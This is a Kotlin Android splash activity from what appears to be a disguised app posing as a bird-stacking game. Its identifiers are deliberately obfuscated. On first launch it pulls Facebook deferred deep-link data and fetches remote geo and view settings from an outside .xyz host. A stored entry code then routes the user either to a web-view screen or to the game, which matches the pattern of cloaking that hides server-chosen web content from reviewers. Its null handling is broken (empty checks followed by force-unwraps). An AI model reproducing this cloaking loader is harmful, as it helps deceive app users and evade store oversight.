package com.kooapps.stackybir.frgthyhyhy

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.facebook.applinks.AppLinkData
import com.kooapps.stackybir.R
import com.kooapps.stackybir.gtojigtjitg.VebobooooActivity2
import com.kooapps.stackybir.bghhyhyhy.PapapapapapapClas.Companion.ju5uj5ujuj
import com.kooapps.stackybir.bghyhyyh.Ofrokfrkkfkrf
import com.kooapps.stackybir.defrtggthyhyhy.Jfdjf
import com.kooapps.stackybir.ggthigt.GagogogaaammyyActivity2
import com.kooapps.stackybir.ggthigt.SeeeccSeeecaaaActivity2
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.adapter.rxjava3.RxJava3CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory

class SplashinggggActivity2 : AppCompatActivity() {
    private var bnyjuji2ki2ik: CompositeDisposable? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splashingggg2)

        val frjirfjjgtijigt = Ofrokfrkkfkrf()


        val fvrfgjtgtjigtgt = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (fvrfgjtgtjigtgt.getBoolean("activity_exec", false)) {
            val cffrrfgrfgtgtgt = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
            val vffrbfrygfrgyrf =  cffrrfgrfgtgtgt.getString("ENTRY_CODE", "0")
            if (vffrbfrygfrgyrf == "web"){
                startActivity(Intent(this, VebobooooActivity2::class.java))
                finish()
            } else {
                startActivity(Intent(this, GagogogaaammyyActivity2::class.java))
                finish()
            }
        } else {
            val gtojgfjrfhuifrhfr = fvrfgjtgtjigtgt.edit()
            gtojgfjrfhuifrhfr.putBoolean("activity_exec", true)
            gtojgfjrfhuifrhfr.apply()


            hghy59hy9h5(this)


            bnyjuji2ki2ik = CompositeDisposable()

            val ju59ki5ki5k9ik = Retrofit.Builder()
                .baseUrl("http://miraculouscrown.xyz/")
                .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build().create(Ofrokfrkkfkrf.PForfrkrfkof::class.java)

            bnyjuji2ki2ik?.add(
                ju59ki5ki5k9ik.gogogtadatata()
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribeOn(Schedulers.io())
                    .subscribe({ response -> onResponse(response) }, { t -> onFailure(t) })
            )
        }
    }

    private fun onResponse(response: Jfdjf) {

        Log.d("lolo", "${response}")
        ju5uj5ujuj["AppsCh"] = response.ballapps
        ju5uj5ujuj["GeoHose"] = response.ballgeo
        ju5uj5ujuj["View"] = response.ballview

        startActivity(Intent(this@SplashinggggActivity2, SeeeccSeeecaaaActivity2::class.java))
        finish()

    }

    private fun onFailure(t: Throwable) {
        Toast.makeText(this,t.message, Toast.LENGTH_SHORT).show()
        Log.d("lolo", "${t.message}")
    }

    fun hghy59hy9h5(ju59ki59ik5ikik: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            ju59ki59ik5ikik
        ) {
            if (it == null){

            }
            if (it!!.targetUri == null){

            }
            val dephyoujojuo = it!!.targetUri?.host.toString()
            ju5uj5ujuj["FBData"] = dephyoujojuo
        }
    }
}